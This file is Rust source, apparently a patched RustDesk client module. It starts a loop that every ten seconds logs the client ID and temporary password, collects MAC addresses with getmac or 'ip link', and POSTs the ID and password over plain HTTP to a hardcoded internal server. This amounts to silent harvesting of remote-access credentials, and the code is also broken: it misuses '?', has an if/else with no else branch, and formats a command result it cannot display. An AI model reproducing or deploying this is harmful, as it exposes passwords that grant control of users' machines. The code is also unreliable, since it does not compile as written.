use crate::hbbs_http::create_http_client;
use crate::ipc;
use hbb_common::{log, password_security};
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE};
use std::collections::HashMap;
use std::process::Command;
use std::thread;
use std::time::Duration;

pub fn start_task() {
    log::info!("uploader_start");
    thread::spawn(move || loop {
        upload();
        thread::sleep(Duration::from_secs(10));
    });
}

fn upload() {
    log::info!("id=======>{}", ipc::get_id());
    log::info!(
        "passwd==========>{}",
        password_security::temporary_password()
    );
    let output = if cfg!(target_os = "windows") {
        // Windows: 使用 getmac 命令
        Command::new("getmac").arg("/fo").arg("csv").output()?
    } else if cfg!(target_os = "linux") {
        // Linux: 使用 ip link 命令
        Command::new("ip").arg("link").output()?
    };
    log::info!("mac=======>{}", output);

    let client = create_http_client();
    let mut headers = HeaderMap::new();
    headers.insert("tenant-id", HeaderValue::from_static("1"));
    headers.insert("Content-Type", HeaderValue::from_static("application/json"));
    let mut json_data = HashMap::new();
    json_data.insert("clientId", ipc::get_id());
    json_data.insert("clientPasswd", password_security::temporary_password());

    match client
        .post("http://10.19.53.39:48080/app-api/rdm/rustdesk-client/upload-client-info")
        .headers(headers)
        .json(&json_data)
        .send()
    {
        Ok(response) => {
            log::info!("HTTP OK");
        }
        Err(e) => {
            log::info!("ERR err=========>{}", e);
        }
    };
}
